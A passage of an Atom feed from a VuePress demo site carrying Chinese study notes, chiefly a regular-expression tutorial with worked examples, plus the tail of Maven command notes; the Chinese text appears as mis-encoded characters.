<li>mvn clean compileï¼šæ¸…ç†+ç¼–è¯‘</li>
<li>mvn clean testï¼šæ¸…ç†+ç¼–è¯‘+æ‰§è¡Œæµ‹è¯•é“¾æ¥</li>
<li>mvn clean packageï¼šæ¸…ç†+ç¼–è¯‘+æ‰“åŒ…</li>
<li>mvn clean installï¼šæ¸…ç†+ç¼–è¯‘+æ‰“åŒ…+æ”¾ç½®æœ¬åœ°ä»“åº“</li>
<li>mvn archetype:generateï¼šåˆ›å»ºé¡¹ç›®éª¨æ¶</li>
<li>mvn dependency:listï¼šæŸ¥çœ‹å½“å‰é¡¹ç›®çš„å·²è§£æä¾èµ–</li>
<li>mvn dependency:treeï¼šæŸ¥çœ‹å½“å‰é¡¹ç›®çš„ä¾èµ–æ ‘</li>
<li>mvn dependency:analyzeï¼šè‡ªåŠ¨åŒ–åˆ†æå½“å‰é¡¹ç›®çš„ä¾èµ–</li>
</ul>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li><a href="http://maven.apache.org/pom.html#Dependency_Version_Requirement_Specification" target="_blank" rel="noopener noreferrer">POM Reference</a></li>
<li><a href="https://stackoverflow.com/questions/7249871/what-is-a-build-tool" target="_blank" rel="noopener noreferrer">What is a build tool?</a></li>
<li><a href="https://programmingmitra.blogspot.com/2016/05/java-build-tools-comparisons-ant-vs.html" target="_blank" rel="noopener noreferrer">Java Build Tools Comparisons: Ant vs Maven vs Gradle</a></li>
<li><a href="http://sagioto.github.io/maven2gradle/" target="_blank" rel="noopener noreferrer">maven 2 gradle</a></li>
<li><a href="https://www.imooc.com/learn/833" target="_blank" rel="noopener noreferrer">æ–°ä¸€ä»£æ„å»ºå·¥å…· gradle</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€æ¦‚è¿°</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="ä¸€ã€æ¦‚è¿°" tabindex="-1"> ä¸€ã€æ¦‚è¿°</h1>
<p>æ­£åˆ™è¡¨è¾¾å¼ç”¨äºæ–‡æœ¬å†…å®¹çš„æŸ¥æ‰¾å’Œæ›¿æ¢ã€‚</p>
<p>æ­£åˆ™è¡¨è¾¾å¼å†…ç½®äºå…¶å®ƒè¯­è¨€æˆ–è€…è½¯ä»¶äº§å“ä¸­ï¼Œå®ƒæœ¬èº«ä¸æ˜¯ä¸€ç§è¯­è¨€æˆ–è€…è½¯ä»¶ã€‚</p>
<p><a href="https://regexr.com/" target="_blank" rel="noopener noreferrer">æ­£åˆ™è¡¨è¾¾å¼åœ¨çº¿å·¥å…·</a></p>
<h1 id="äºŒã€åŒ¹é…å•ä¸ªå­—ç¬¦" tabindex="-1"> äºŒã€åŒ¹é…å•ä¸ªå­—ç¬¦</h1>
<p><strong>.</strong>  å¯ä»¥ç”¨æ¥åŒ¹é…ä»»ä½•çš„å•ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯åœ¨ç»å¤§å¤šæ•°å®ç°é‡Œé¢ï¼Œä¸èƒ½åŒ¹é…æ¢è¡Œç¬¦ï¼›</p>
<p><strong>.</strong>  æ˜¯å…ƒå­—ç¬¦ï¼Œè¡¨ç¤ºå®ƒæœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼Œè€Œä¸æ˜¯å­—ç¬¦æœ¬èº«çš„å«ä¹‰ã€‚å¦‚æœéœ€è¦åŒ¹é… . ï¼Œé‚£ä¹ˆè¦ç”¨ \ è¿›è¡Œè½¬ä¹‰ï¼Œå³åœ¨ . å‰é¢åŠ ä¸Š \ ã€‚</p>
<p>æ­£åˆ™è¡¨è¾¾å¼ä¸€èˆ¬æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œä½†æ˜¯ä¹Ÿæœ‰äº›å®ç°æ˜¯ä¸åŒºåˆ†ã€‚</p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<div><pre><code>nam.
</code></pre></div><p><strong>åŒ¹é…ç»“æœ</strong></p>
<p>My  <strong>name</strong>  is Zheng.</p>
<h1 id="ä¸‰ã€åŒ¹é…ä¸€ç»„å­—ç¬¦" tabindex="-1"> ä¸‰ã€åŒ¹é…ä¸€ç»„å­—ç¬¦</h1>
<p><strong>[ ]</strong>  å®šä¹‰ä¸€ä¸ªå­—ç¬¦é›†åˆï¼›</p>
<p>0-9ã€a-z å®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦åŒºé—´ï¼ŒåŒºé—´ä½¿ç”¨ ASCII ç æ¥ç¡®å®šï¼Œå­—ç¬¦åŒºé—´åœ¨ [ ] ä¸­ä½¿ç”¨ã€‚</p>
<p><strong>-</strong>  åªæœ‰åœ¨ [ ] ä¹‹é—´æ‰æ˜¯å…ƒå­—ç¬¦ï¼Œåœ¨ [ ] ä¹‹å¤–å°±æ˜¯ä¸€ä¸ªæ™®é€šå­—ç¬¦ï¼›</p>
<p><strong>^</strong>  åœ¨ [ ] ä¸­æ˜¯å–éæ“ä½œã€‚</p>
<p><strong>åº”ç”¨</strong></p>
<p>åŒ¹é…ä»¥ abc ä¸ºå¼€å¤´ï¼Œå¹¶ä¸”æœ€åä¸€ä¸ªå­—æ¯ä¸ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²ï¼š</p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<div><pre><code>abc[^0-9]
</code></pre></div><p><strong>åŒ¹é…ç»“æœ</strong></p>
<ol>
<li><strong>abcd</strong></li>
<li>abc1</li>
<li>abc2</li>
</ol>
<h1 id="å››ã€ä½¿ç”¨å…ƒå­—ç¬¦" tabindex="-1"> å››ã€ä½¿ç”¨å…ƒå­—ç¬¦</h1>
<h2 id="åŒ¹é…ç©ºç™½å­—ç¬¦" tabindex="-1"> åŒ¹é…ç©ºç™½å­—ç¬¦</h2>
<table>
<thead>
<tr>
<th style="text-align:center">å…ƒå­—ç¬¦</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">[\b]</td>
<td style="text-align:center">å›é€€ï¼ˆåˆ é™¤ï¼‰ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td style="text-align:center">\f</td>
<td style="text-align:center">æ¢é¡µç¬¦</td>
</tr>
<tr>
<td style="text-align:center">\n</td>
<td style="text-align:center">æ¢è¡Œç¬¦</td>
</tr>
<tr>
<td style="text-align:center">\r</td>
<td style="text-align:center">å›è½¦ç¬¦</td>
</tr>
<tr>
<td style="text-align:center">\t</td>
<td style="text-align:center">åˆ¶è¡¨ç¬¦</td>
</tr>
<tr>
<td style="text-align:center">\v</td>
<td style="text-align:center">å‚ç›´åˆ¶è¡¨ç¬¦</td>
</tr>
</tbody>
</table>
<p>\r\n æ˜¯ Windows ä¸­çš„æ–‡æœ¬è¡Œç»“æŸæ ‡ç­¾ï¼Œåœ¨ Unix/Linux åˆ™æ˜¯ \nã€‚</p>
<p>\r\n\r\n å¯ä»¥åŒ¹é… Windows ä¸‹çš„ç©ºç™½è¡Œï¼Œå› ä¸ºå®ƒåŒ¹é…ä¸¤ä¸ªè¿ç»­çš„è¡Œå°¾æ ‡ç­¾ï¼Œè€Œè¿™æ­£æ˜¯ä¸¤æ¡è®°å½•ä¹‹é—´çš„ç©ºç™½è¡Œï¼›</p>
<h2 id="åŒ¹é…ç‰¹å®šçš„å­—ç¬¦ç±»åˆ«" tabindex="-1"> åŒ¹é…ç‰¹å®šçš„å­—ç¬¦ç±»åˆ«</h2>
<h3 id="_1-æ•°å­—å…ƒå­—ç¬¦" tabindex="-1"> 1. æ•°å­—å…ƒå­—ç¬¦</h3>
<table>
<thead>
<tr>
<th style="text-align:center">å…ƒå­—ç¬¦</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\d</td>
<td style="text-align:center">æ•°å­—å­—ç¬¦ï¼Œç­‰ä»·äº [0-9]</td>
</tr>
<tr>
<td style="text-align:center">\D</td>
<td style="text-align:center">éæ•°å­—å­—ç¬¦ï¼Œç­‰ä»·äº [^0-9]</td>
</tr>
</tbody>
</table>
<h3 id="_2-å­—æ¯æ•°å­—å…ƒå­—ç¬¦" tabindex="-1"> 2. å­—æ¯æ•°å­—å…ƒå­—ç¬¦</h3>
<table>
<thead>
<tr>
<th style="text-align:center">å…ƒå­—ç¬¦</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\w</td>
<td style="text-align:center">å¤§å°å†™å­—æ¯ï¼Œä¸‹åˆ’çº¿å’Œæ•°å­—ï¼Œç­‰ä»·äº [a-zA-Z0-9_]</td>
</tr>
<tr>
<td style="text-align:center">\W</td>
<td style="text-align:center">å¯¹ \w å–é</td>
</tr>
</tbody>
</table>
<h3 id="_3-ç©ºç™½å­—ç¬¦å…ƒå­—ç¬¦" tabindex="-1"> 3. ç©ºç™½å­—ç¬¦å…ƒå­—ç¬¦</h3>
<table>
<thead>
<tr>
<th style="text-align:center">å…ƒå­—ç¬¦</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\s</td>
<td style="text-align:center">ä»»ä½•ä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼Œç­‰ä»·äº [\f\n\r\t\v]</td>
</tr>
<tr>
<td style="text-align:center">\S</td>
<td style="text-align:center">å¯¹ \s å–é</td>
</tr>
</tbody>
</table>
<p>\x åŒ¹é…åå…­è¿›åˆ¶å­—ç¬¦ï¼Œ\0 åŒ¹é…å…«è¿›åˆ¶ï¼Œä¾‹å¦‚ \x0A å¯¹åº” ASCII å­—ç¬¦ 10ï¼Œç­‰ä»·äº \nã€‚</p>
<h1 id="äº”ã€é‡å¤åŒ¹é…" tabindex="-1"> äº”ã€é‡å¤åŒ¹é…</h1>
<ul>
<li><strong>+</strong>  åŒ¹é… 1 ä¸ªæˆ–è€…å¤šä¸ªå­—ç¬¦</li>
<li>*<em>*</em> * åŒ¹é… 0 ä¸ªæˆ–è€…å¤šä¸ª</li>
<li><strong>?</strong>  åŒ¹é… 0 ä¸ªæˆ–è€… 1 ä¸ª</li>
</ul>
<p><strong>åº”ç”¨</strong></p>
<p>åŒ¹é…é‚®ç®±åœ°å€ã€‚</p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<div><pre><code>[\w.]+@\w+\.\w+
</code></pre></div><p>[\w.] åŒ¹é…çš„æ˜¯å­—æ¯æ•°å­—æˆ–è€… . ï¼Œåœ¨å…¶åé¢åŠ ä¸Š + ï¼Œè¡¨ç¤ºåŒ¹é…å¤šæ¬¡ã€‚åœ¨å­—ç¬¦é›†åˆ [ ] é‡Œï¼Œ. ä¸æ˜¯å…ƒå­—ç¬¦ï¼›</p>
<p><strong>åŒ¹é…ç»“æœ</strong></p>
<p><strong>abc.def<span>@</span>qq.com</strong></p>
<ul>
<li><strong>{n}</strong>  åŒ¹é… n ä¸ªå­—ç¬¦</li>
<li><strong>{m, n}</strong>  åŒ¹é… m~n ä¸ªå­—ç¬¦</li>
<li><strong>{m,}</strong>  è‡³å°‘åŒ¹é… m ä¸ªå­—ç¬¦</li>
</ul>
<p>* å’Œ + éƒ½æ˜¯è´ªå©ªå‹å…ƒå­—ç¬¦ï¼Œä¼šåŒ¹é…å°½å¯èƒ½å¤šçš„å†…å®¹ã€‚åœ¨åé¢åŠ  ? å¯ä»¥è½¬æ¢ä¸ºæ‡’æƒ°å‹å…ƒå­—ç¬¦ï¼Œä¾‹å¦‚ *?ã€+? å’Œ {m, n}? ã€‚</p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<div><pre><code>a.+c
</code></pre></div><p>ç”±äº + æ˜¯è´ªå©ªå‹çš„ï¼Œå› æ­¤ .+ ä¼šåŒ¹é…æ›´å¯èƒ½å¤šçš„å†…å®¹ï¼Œæ‰€ä»¥ä¼šæŠŠæ•´ä¸ª abcabcabc æ–‡æœ¬éƒ½åŒ¹é…ï¼Œè€Œä¸æ˜¯åªåŒ¹é…å‰é¢çš„ abc æ–‡æœ¬ã€‚ç”¨æ‡’æƒ°å‹å¯ä»¥å®ç°åŒ¹é…å‰é¢çš„ã€‚</p>
<p><strong>åŒ¹é…ç»“æœ</strong></p>
<p><strong>abcabcabc</strong></p>
<h1 id="å…­ã€ä½ç½®åŒ¹é…" tabindex="-1"> å…­ã€ä½ç½®åŒ¹é…</h1>
<h2 id="å•è¯è¾¹ç•Œ" tabindex="-1"> å•è¯è¾¹ç•Œ</h2>
<p><strong>\b</strong>  å¯ä»¥åŒ¹é…ä¸€ä¸ªå•è¯çš„è¾¹ç•Œï¼Œè¾¹ç•Œæ˜¯æŒ‡ä½äº \w å’Œ \W ä¹‹é—´çš„ä½ç½®ï¼›<strong>\B</strong> åŒ¹é…ä¸€ä¸ªä¸æ˜¯å•è¯è¾¹ç•Œçš„ä½ç½®ã€‚</p>
<p>\b åªåŒ¹é…ä½ç½®ï¼Œä¸åŒ¹é…å­—ç¬¦ï¼Œå› æ­¤ \babc\b åŒ¹é…å‡ºæ¥çš„ç»“æœä¸º 3 ä¸ªå­—ç¬¦ã€‚</p>
<h2 id="å­—ç¬¦ä¸²è¾¹ç•Œ" tabindex="-1"> å­—ç¬¦ä¸²è¾¹ç•Œ</h2>
<p><strong>^</strong>  åŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²çš„å¼€å¤´ï¼Œ<strong>$</strong> åŒ¹é…ç»“å°¾ã€‚</p>
<p>^ å…ƒå­—ç¬¦åœ¨å­—ç¬¦é›†åˆä¸­ç”¨ä½œæ±‚éï¼Œåœ¨å­—ç¬¦é›†åˆå¤–ç”¨ä½œåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´ã€‚</p>
<p>åˆ†è¡ŒåŒ¹é…æ¨¡å¼ï¼ˆmultilineï¼‰ä¸‹ï¼Œæ¢è¡Œè¢«å½“åšå­—ç¬¦ä¸²çš„è¾¹ç•Œã€‚</p>
<p><strong>åº”ç”¨</strong></p>
<p>åŒ¹é…ä»£ç ä¸­ä»¥ // å¼€å§‹çš„æ³¨é‡Šè¡Œ</p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<div><pre><code>^\s*\/\/.*$
</code></pre></div><div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/600e9c75-5033-4dad-ae2b-930957db638e.png"/> </div><br>
<p><strong>åŒ¹é…ç»“æœ</strong></p>
<ol>
<li>public void fun() {</li>
<li>Â Â Â Â      <strong>// æ³¨é‡Š 1</strong></li>
<li>Â Â Â Â     int a = 1;</li>
<li>Â Â Â Â     int b = 2;</li>
<li>Â Â Â Â      <strong>// æ³¨é‡Š 2</strong></li>
<li>Â Â Â Â     int c = a + b;</li>
<li>}</li>
</ol>
<h1 id="ä¸ƒã€ä½¿ç”¨å­è¡¨è¾¾å¼" tabindex="-1"> ä¸ƒã€ä½¿ç”¨å­è¡¨è¾¾å¼</h1>
<p>ä½¿ç”¨  <strong>( )</strong>  å®šä¹‰ä¸€ä¸ªå­è¡¨è¾¾å¼ã€‚å­è¡¨è¾¾å¼çš„å†…å®¹å¯ä»¥å½“æˆä¸€ä¸ªç‹¬ç«‹å…ƒç´ ï¼Œå³å¯ä»¥å°†å®ƒçœ‹æˆä¸€ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”ä½¿ç”¨ * ç­‰å…ƒå­—ç¬¦ã€‚</p>
<p>å­è¡¨è¾¾å¼å¯ä»¥åµŒå¥—ï¼Œä½†æ˜¯åµŒå¥—å±‚æ¬¡è¿‡æ·±ä¼šå˜å¾—å¾ˆéš¾ç†è§£ã€‚</p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<div><pre><code>(ab){2,}
</code></pre></div><p><strong>åŒ¹é…ç»“æœ</strong></p>
<p><strong>ababab</strong></p>
<p><strong>|</strong>  æ˜¯æˆ–å…ƒå­—ç¬¦ï¼Œå®ƒæŠŠå·¦è¾¹å’Œå³è¾¹æ‰€æœ‰çš„éƒ¨åˆ†éƒ½çœ‹æˆå•ç‹¬çš„ä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸¤ä¸ªéƒ¨åˆ†åªè¦æœ‰ä¸€ä¸ªåŒ¹é…å°±è¡Œã€‚</p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<div><pre><code>(19|20)\d{2}
</code></pre></div><p><strong>åŒ¹é…ç»“æœ</strong></p>
<ol>
<li><strong>1900</strong></li>
<li><strong>2010</strong></li>
<li>1020</li>
</ol>
<p><strong>åº”ç”¨</strong></p>
<p>åŒ¹é… IP åœ°å€ã€‚</p>
<p>IP åœ°å€ä¸­æ¯éƒ¨åˆ†éƒ½æ˜¯ 0-255 çš„æ•°å­—ï¼Œç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ—¶ä»¥ä¸‹æƒ…å†µæ˜¯åˆæ³•çš„ï¼š</p>
<ul>
<li>ä¸€ä½æ•°å­—</li>
<li>ä¸ä»¥ 0 å¼€å¤´çš„ä¸¤ä½æ•°å­—</li>
<li>1 å¼€å¤´çš„ä¸‰ä½æ•°</li>
<li>2 å¼€å¤´ï¼Œç¬¬ 2 ä½æ˜¯ 0-4 çš„ä¸‰ä½æ•°</li>
<li>25 å¼€å¤´ï¼Œç¬¬ 3 ä½æ˜¯ 0-5 çš„ä¸‰ä½æ•°</li>
</ul>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<div><pre><code>((25[0-5]|(2[0-4]\d)|(1\d{2})|([1-9]\d)|(\d))\.){3}(25[0-5]|(2[0-4]\d)|(1\d{2})|([1-9]\d)|(\d))
</code></pre></div><p><strong>åŒ¹é…ç»“æœ</strong></p>
<ol>
<li><strong>192.168.0.1</strong></li>
<li>00.00.00.00</li>
<li>555.555.555.555</li>
</ol>
<h1 id="å…«ã€å›æº¯å¼•ç”¨" tabindex="-1"> å…«ã€å›æº¯å¼•ç”¨</h1>
<p>å›æº¯å¼•ç”¨ä½¿ç”¨  <strong>\n</strong>  æ¥å¼•ç”¨æŸä¸ªå­è¡¨è¾¾å¼ï¼Œå…¶ä¸­ n ä»£è¡¨çš„æ˜¯å­è¡¨è¾¾å¼çš„åºå·ï¼Œä» 1 å¼€å§‹ã€‚å®ƒå’Œå­è¡¨è¾¾å¼åŒ¹é…çš„å†…å®¹ä¸€è‡´ï¼Œæ¯”å¦‚å­è¡¨è¾¾å¼åŒ¹é…åˆ° abcï¼Œé‚£ä¹ˆå›æº¯å¼•ç”¨éƒ¨åˆ†ä¹Ÿéœ€è¦åŒ¹é… abc ã€‚</p>
<p><strong>åº”ç”¨</strong></p>
<p>åŒ¹é… HTML ä¸­åˆæ³•çš„æ ‡é¢˜å…ƒç´ ã€‚</p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<p>\1 å°†å›æº¯å¼•ç”¨å­è¡¨è¾¾å¼ (h[1-6]) åŒ¹é…çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»å’Œå­è¡¨è¾¾å¼åŒ¹é…çš„å†…å®¹ä¸€è‡´ã€‚</p>
<div><pre><code>&lt;(h[1-6])>\w*?&lt;\/\1>
</code></pre></div><p><strong>åŒ¹é…ç»“æœ</strong></p>
<ol>
<li><strong>&lt;h1&gt;x&lt;/h1&gt;</strong></li>
<li><strong>&lt;h2&gt;x&lt;/h2&gt;</strong></li>
<li>&lt;h3&gt;x&lt;/h1&gt;</li>
</ol>
<h2 id="æ›¿æ¢" tabindex="-1"> æ›¿æ¢</h2>
<p>éœ€è¦ç”¨åˆ°ä¸¤ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚</p>
<p><strong>åº”ç”¨</strong></p>
<p>ä¿®æ”¹ç”µè¯å·ç æ ¼å¼ã€‚</p>
<p><strong>æ–‡æœ¬</strong></p>
<p>313-555-1234</p>
<p><strong>æŸ¥æ‰¾æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<div><pre><code>(\d{3})(-)(\d{3})(-)(\d{4})
</code></pre></div><p><strong>æ›¿æ¢æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<p>åœ¨ç¬¬ä¸€ä¸ªå­è¡¨è¾¾å¼æŸ¥æ‰¾çš„ç»“æœåŠ ä¸Š () ï¼Œç„¶ååŠ ä¸€ä¸ªç©ºæ ¼ï¼Œåœ¨ç¬¬ä¸‰ä¸ªå’Œç¬¬äº”ä¸ªå­—è¡¨è¾¾å¼æŸ¥æ‰¾çš„ç»“æœä¸­é—´åŠ ä¸Š - è¿›è¡Œåˆ†éš”ã€‚</p>
<div><pre><code>($1) $3-$5
</code></pre></div><p><strong>ç»“æœ</strong></p>
<p>(313) 555-1234</p>
<h2 id="å¤§å°å†™è½¬æ¢" tabindex="-1"> å¤§å°å†™è½¬æ¢</h2>
<table>
<thead>
<tr>
<th style="text-align:center">å…ƒå­—ç¬¦</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\l</td>
<td style="text-align:center">æŠŠä¸‹ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå°å†™</td>
</tr>
<tr>
<td style="text-align:center">\u</td>
<td style="text-align:center">æŠŠä¸‹ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå¤§å†™</td>
</tr>
<tr>
<td style="text-align:center">\L</td>
<td style="text-align:center">æŠŠ\L å’Œ\E ä¹‹é—´çš„å­—ç¬¦å…¨éƒ¨è½¬æ¢ä¸ºå°å†™</td>
</tr>
<tr>
<td style="text-align:center">\U</td>
<td style="text-align:center">æŠŠ\U å’Œ\E ä¹‹é—´çš„å­—ç¬¦å…¨éƒ¨è½¬æ¢ä¸ºå¤§å†™</td>
</tr>
<tr>
<td style="text-align:center">\E</td>
<td style="text-align:center">ç»“æŸ\L æˆ–è€…\U</td>
</tr>
</tbody>
</table>
<p><strong>åº”ç”¨</strong></p>
<p>æŠŠæ–‡æœ¬çš„ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå¤§å†™ã€‚</p>
<p><strong>æ–‡æœ¬</strong></p>
<p>abcd</p>
<p><strong>æŸ¥æ‰¾</strong></p>
<div><pre><code>(\w)(\w{2})(\w)
</code></pre></div><p><strong>æ›¿æ¢</strong></p>
<div><pre><code>$1\U$2\E$3
</code></pre></div><p><strong>ç»“æœ</strong></p>
<p>aBCd</p>
<h1 id="ä¹ã€å‰åæŸ¥æ‰¾" tabindex="-1"> ä¹ã€å‰åæŸ¥æ‰¾</h1>
<p>å‰åæŸ¥æ‰¾è§„å®šäº†åŒ¹é…çš„å†…å®¹é¦–å°¾åº”è¯¥åŒ¹é…çš„å†…å®¹ï¼Œä½†æ˜¯åˆä¸åŒ…å«é¦–å°¾åŒ¹é…çš„å†…å®¹ã€‚å‘å‰æŸ¥æ‰¾ç”¨  <strong>?=</strong>  æ¥å®šä¹‰ï¼Œå®ƒè§„å®šäº†å°¾éƒ¨åŒ¹é…çš„å†…å®¹ï¼Œè¿™ä¸ªåŒ¹é…çš„å†…å®¹åœ¨ ?= ä¹‹åå®šä¹‰ã€‚æ‰€è°“å‘å‰æŸ¥æ‰¾ï¼Œå°±æ˜¯è§„å®šäº†ä¸€ä¸ªåŒ¹é…çš„å†…å®¹ï¼Œç„¶åä»¥è¿™ä¸ªå†…å®¹ä¸ºå°¾éƒ¨å‘å‰é¢æŸ¥æ‰¾éœ€è¦åŒ¹é…çš„å†…å®¹ã€‚å‘ååŒ¹é…ç”¨ ?&lt;= å®šä¹‰ï¼ˆæ³¨: javaScript ä¸æ”¯æŒå‘ååŒ¹é…, java å¯¹å…¶æ”¯æŒä¹Ÿä¸å®Œå–„ï¼‰ã€‚</p>
<p><strong>åº”ç”¨</strong></p>
<p>æŸ¥æ‰¾å‡ºé‚®ä»¶åœ°å€ @ å­—ç¬¦å‰é¢çš„éƒ¨åˆ†ã€‚</p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<div><pre><code>\w+(?=@)
</code></pre></div><p><strong>ç»“æœ</strong></p>
<p><strong>abc</strong> @qq.com</p>
<p>å¯¹å‘å‰å’Œå‘åæŸ¥æ‰¾å–éï¼Œåªè¦æŠŠ = æ›¿æ¢æˆ ! å³å¯ï¼Œæ¯”å¦‚ (?=) æ›¿æ¢æˆ (?!) ã€‚å–éæ“ä½œä½¿å¾—åŒ¹é…é‚£äº›é¦–å°¾ä¸ç¬¦åˆè¦æ±‚çš„å†…å®¹ã€‚</p>
<h1 id="åã€åµŒå…¥æ¡ä»¶" tabindex="-1"> åã€åµŒå…¥æ¡ä»¶</h1>
<h2 id="å›æº¯å¼•ç”¨æ¡ä»¶" tabindex="-1"> å›æº¯å¼•ç”¨æ¡ä»¶</h2>
<p>æ¡ä»¶åˆ¤æ–­ä¸ºæŸä¸ªå­è¡¨è¾¾å¼æ˜¯å¦åŒ¹é…ï¼Œå¦‚æœåŒ¹é…åˆ™éœ€è¦ç»§ç»­åŒ¹é…æ¡ä»¶è¡¨è¾¾å¼åé¢çš„å†…å®¹ã€‚</p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<p>å­è¡¨è¾¾å¼ (\() åŒ¹é…ä¸€ä¸ªå·¦æ‹¬å·ï¼Œå…¶åçš„ ? è¡¨ç¤ºåŒ¹é… 0 ä¸ªæˆ–è€… 1 ä¸ªã€‚ ?(1) ä¸ºæ¡ä»¶ï¼Œå½“å­è¡¨è¾¾å¼ 1 åŒ¹é…æ—¶æ¡ä»¶æˆç«‹ï¼Œéœ€è¦æ‰§è¡Œ ) åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯åŒ¹é…å³æ‹¬å·ã€‚</p>
<div><pre><code>(\()?abc(?(1)\))
</code></pre></div><p><strong>ç»“æœ</strong></p>
<ol>
<li><strong>(abc)</strong></li>
<li><strong>abc</strong></li>
<li>(abc</li>
</ol>
<h2 id="å‰åæŸ¥æ‰¾æ¡ä»¶" tabindex="-1"> å‰åæŸ¥æ‰¾æ¡ä»¶</h2>
<p>æ¡ä»¶ä¸ºå®šä¹‰çš„é¦–å°¾æ˜¯å¦åŒ¹é…ï¼Œå¦‚æœåŒ¹é…ï¼Œåˆ™ç»§ç»­æ‰§è¡Œåé¢çš„åŒ¹é…ã€‚æ³¨æ„ï¼Œé¦–å°¾ä¸åŒ…å«åœ¨åŒ¹é…çš„å†…å®¹ä¸­ã€‚</p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p>
<p>?(?=-) ä¸ºå‰å‘æŸ¥æ‰¾æ¡ä»¶ï¼Œåªæœ‰åœ¨ä»¥ - ä¸ºå‰å‘æŸ¥æ‰¾çš„ç»“å°¾èƒ½åŒ¹é… \d{5} ï¼Œæ‰ç»§ç»­åŒ¹é… -\d{4} ã€‚</p>
<div><pre><code>\d{5}(?(?=-)-\d{4})
</code></pre></div><p><strong>ç»“æœ</strong></p>
<ol>
<li><strong>11111</strong></li>
<li>22222-</li>
<li><strong>33333-4444</strong></li>
</ol>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>BenForta. æ­£åˆ™è¡¨è¾¾å¼å¿…çŸ¥å¿…ä¼š [M]. äººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾, 2007.</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">å·¥ç¨‹è´¨é‡</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä»£ç å¯è¯»æ€§</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F/%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F/%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7.html"/>
    <updated>2022-05-16T11:59:04.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
